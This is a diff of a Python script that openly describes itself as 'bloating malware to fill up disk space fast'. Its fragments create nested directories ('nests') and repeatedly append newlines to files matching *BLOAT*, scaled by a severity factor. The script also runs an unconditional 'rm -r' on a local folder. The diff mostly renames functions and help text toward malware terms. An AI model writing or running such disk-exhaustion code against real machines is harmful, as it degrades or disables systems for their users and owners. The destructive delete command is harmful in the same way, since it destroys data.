@@ -6,28 +6,31 @@ import random
 import termcolor as tc
 import numpy as np
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(add_help=False)
+parser.add_argument('-h',
+                    '--help',
+                    help='Bloating malware to fill up disk space fast')
 parser.add_argument('-p',
                     '--parasite',
                     help='Specify number of parasites to infest (# of nests).',
                     type=int)
 parser.add_argument('-s',
                     '--spore',
-                    help='Specify number of spores to spread (# of worms).',
+                    help='Specify number of worms to transport in spores.',
                     type=int)
 parser.add_argument('-x',
                     '--xfactor',
-                    help='Specify severity of infestation (40-400 is safe).',
+                    help='Specify severity of infestation (size of worms)',
                     type=int)
 
 # TODO remove after dev/testing
-if 'PARASITE' in os.listdir(os.getcwd()):
-    subprocess.call(['rm', '-r', 'PARASITE'])
+if 'parasite' in os.listdir(os.getcwd()):
+    subprocess.call(['rm', '-r', 'parasite'])
 # --
 
 
-def procreate(virus_type):
-    print(tc.colored('PROCREATING WORMS', 'cyan'))
+def infest(virus_type):
+    print(tc.colored('PARASITE INFESTING SYSTEM', 'cyan'))
     subprocess.call(['mkdir', virus_type])
     curr_path = os.getcwd()
     goto_path = curr_path + '/' + virus_type
@@ -65,7 +68,7 @@ def organic():
 
 
 
-## -- VIRUS -- ##
+## -- MALWARE -- ##
 def outbreak():
     args = parser.parse_args()
 
@@ -73,7 +76,7 @@ def outbreak():
         print(tc.colored('INFECTING', 'red', attrs=['bold']))
         worms = glob.glob('*BLOAT*', recursive=True)
         for worm in worms:
-            print(tc.colored(worm, 'green'))
+            print(tc.colored(worm, 'red'))
             with open(worm, 'a') as f:
                 for i in range(severity):
                     f.write('\n')
@@ -90,7 +93,7 @@ def outbreak():
         nests = organic()
 
     for i in range(nests):
-        procreate('PARASITE')
+        infest('parasite')
 
         if args.spore:
             spores(args.spore)
